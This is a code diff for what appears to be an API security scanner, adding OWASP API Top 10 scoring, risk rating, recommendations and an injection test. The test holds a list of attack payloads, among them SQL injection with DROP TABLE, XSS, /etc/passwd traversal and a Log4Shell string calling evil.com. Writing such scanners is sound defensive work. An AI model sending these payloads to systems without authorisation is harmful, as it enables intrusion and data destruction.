@@ -793,4 +793,207 @@ async def test_insufficient_logging(base_url: str, endpoints: List[APIEndpoint],
     
     tests.append(test)
     return {"tests": tests, "vulnerabilities": vulnerabilities}
-```
+
+def analyze_owasp_api_top10_compliance(vulnerabilities, security_tests):
+    """Analyze OWASP API Top 10 compliance based on vulnerabilities and tests"""
+    owasp_categories = {
+        "API1:2023 Broken Object Level Authorization": 0,
+        "API2:2023 Broken Authentication": 0,
+        "API3:2023 Broken Object Property Level Authorization": 0,
+        "API4:2023 Unrestricted Resource Consumption": 0,
+        "API5:2023 Broken Function Level Authorization": 0,
+        "API6:2023 Unrestricted Access to Sensitive Business Flows": 0,
+        "API7:2023 Server Side Request Forgery": 0,
+        "API8:2023 Security Misconfiguration": 0,
+        "API9:2023 Improper Inventory Management": 0,
+        "API10:2023 Unsafe Consumption of APIs": 0
+    }
+    
+    # Count vulnerabilities by OWASP category
+    for vuln in vulnerabilities:
+        category = getattr(vuln, 'owasp_category', None)
+        if category in owasp_categories:
+            owasp_categories[category] += 1
+    
+    # Calculate compliance score (percentage of categories without issues)
+    total_categories = len(owasp_categories)
+    compliant_categories = sum(1 for count in owasp_categories.values() if count == 0)
+    compliance_score = (compliant_categories / total_categories) * 100
+    
+    return {
+        "compliance_score": compliance_score,
+        "categories": owasp_categories,
+        "total_categories": total_categories,
+        "compliant_categories": compliant_categories
+    }
+
+def calculate_security_score(vulnerabilities, security_tests):
+    """Calculate overall security score based on vulnerabilities and tests"""
+    if not security_tests:
+        return 0.0
+    
+    # Base score starts at 100
+    score = 100.0
+    
+    # Deduct points based on vulnerability severity
+    for vuln in vulnerabilities:
+        if vuln.severity == "Critical":
+            score -= 15
+        elif vuln.severity == "High":
+            score -= 10
+        elif vuln.severity == "Medium":
+            score -= 5
+        elif vuln.severity == "Low":
+            score -= 2
+    
+    # Bonus for passing tests
+    passed_tests = sum(1 for test in security_tests if getattr(test, 'passed', False))
+    total_tests = len(security_tests)
+    test_bonus = (passed_tests / total_tests) * 10 if total_tests > 0 else 0
+    score += test_bonus
+    
+    # Ensure score is between 0 and 100
+    return max(0.0, min(100.0, score))
+
+def determine_risk_rating(vulnerabilities):
+    """Determine overall risk rating based on vulnerabilities"""
+    if not vulnerabilities:
+        return "Low"
+    
+    critical_count = sum(1 for v in vulnerabilities if v.severity == "Critical")
+    high_count = sum(1 for v in vulnerabilities if v.severity == "High")
+    medium_count = sum(1 for v in vulnerabilities if v.severity == "Medium")
+    
+    if critical_count >= 3 or (critical_count >= 1 and high_count >= 3):
+        return "Critical"
+    elif critical_count >= 1 or high_count >= 5:
+        return "High"
+    elif high_count >= 1 or medium_count >= 5:
+        return "Medium"
+    else:
+        return "Low"
+
+def generate_recommendations(vulnerabilities, security_tests, owasp_compliance):
+    """Generate security recommendations based on findings"""
+    recommendations = []
+    
+    # Basic recommendations based on vulnerability severity
+    critical_vulns = [v for v in vulnerabilities if v.severity == "Critical"]
+    high_vulns = [v for v in vulnerabilities if v.severity == "High"]
+    
+    if critical_vulns:
+        recommendations.append("Immediately address all critical vulnerabilities before deploying to production")
+        recommendations.append("Implement emergency security patches for critical issues")
+    
+    if high_vulns:
+        recommendations.append("Prioritize remediation of high-severity vulnerabilities")
+        recommendations.append("Review and strengthen authentication and authorization mechanisms")
+    
+    # OWASP-specific recommendations
+    if owasp_compliance["compliance_score"] < 80:
+        recommendations.append("Improve OWASP API Security Top 10 compliance")
+        recommendations.append("Implement comprehensive API security testing in CI/CD pipeline")
+    
+    # Authentication and authorization recommendations
+    auth_vulns = [v for v in vulnerabilities if "auth" in v.category.lower()]
+    if auth_vulns:
+        recommendations.append("Implement robust authentication and session management")
+        recommendations.append("Use OAuth 2.0 or similar industry-standard authentication protocols")
+    
+    # General security recommendations
+    recommendations.extend([
+        "Implement proper input validation and sanitization",
+        "Use HTTPS for all API communications",
+        "Implement rate limiting to prevent abuse",
+        "Regular security assessments and penetration testing",
+        "Monitor API usage and implement logging for security events"
+    ])
+    
+    return recommendations[:10]  # Limit to top 10 recommendations
+
+async def test_injection_vulnerabilities(base_url, endpoints, headers, include_fuzzing, delay):
+    """Test for injection vulnerabilities"""
+    vulnerabilities = []
+    tests = []
+    
+    injection_payloads = [
+        "' OR '1'='1",
+        "'; DROP TABLE users; --",
+        "<script>alert('xss')</script>",
+        "../../../etc/passwd",
+        "${jndi:ldap://evil.com/a}",
+        "{{7*7}}",
+        "<%=7*7%>",
+        "';WAITFOR DELAY '00:00:05'--"
+    ]
+    
+    test = SecurityTest(
+        test_name="Injection Vulnerability Test",
+        category="OWASP API8",
+        description="Testing for injection vulnerabilities including SQL, XSS, and command injection",
+        executed=True,
+        passed=True,
+        findings=[],
+        recommendations=[]
+    )
+    
+    for endpoint in endpoints:
+        if hasattr(endpoint, 'parameters') and endpoint.parameters:
+            for param in endpoint.parameters:
+                for payload in injection_payloads:
+                    try:
+                        if endpoint.method == "GET":
+                            url = f"{base_url.rstrip('/')}{endpoint.path}?{param}={payload}"
+                            async with aiohttp.ClientSession() as session:
+                                async with session.get(url, headers=headers, timeout=10) as response:
+                                    response_text = await response.text()
+                        else:
+                            url = f"{base_url.rstrip('/')}{endpoint.path}"
+                            data = {param: payload}
+                            async with aiohttp.ClientSession() as session:
+                                async with session.post(url, json=data, headers=headers, timeout=10) as response:
+                                    response_text = await response.text()
+                        
+                        # Check for injection indicators
+                        error_indicators = [
+                            'sql syntax', 'mysql_fetch', 'ora-', 'postgresql',
+                            'sqlite', 'mongodb', 'command not found', 'permission denied',
+                            'syntax error', 'unexpected token'
+                        ]
+                        
+                        for indicator in error_indicators:
+                            if indicator in response_text.lower():
+                                vulnerabilities.append(APIVulnerability(
+                                    severity="High",
+                                    category="Injection",
+                                    title=f"Potential Injection Vulnerability in {param}",
+                                    description=f"Parameter '{param}' may be vulnerable to injection attacks",
+                                    endpoint=endpoint.path,
+                                    method=endpoint.method,
+                                    request_details={"parameter": param, "payload": payload},
+                                    response_details={"indicator": indicator},
+                                    owasp_category="API8:2023 Security Misconfiguration",
+                                    cwe_id="CWE-89",
+                                    remediation="Implement proper input validation and parameterized queries"
+                                ))
+                                test.passed = False
+                                test.findings.append(f"Injection vulnerability detected in parameter: {param}")
+                        
+                        # Add delay to avoid overwhelming the target
+                        if delay:
+                            await asyncio.sleep(delay)
+                    
+                    except Exception as e:
+                        # Log error but continue testing
+                        continue
+    
+    if not test.passed:
+        test.recommendations = [
+            "Implement input validation and sanitization",
+            "Use parameterized queries for database interactions",
+            "Apply principle of least privilege for database access",
+            "Implement Web Application Firewall (WAF)"
+        ]
+    
+    tests.append(test)
+    return {"tests": tests, "vulnerabilities": vulnerabilities}
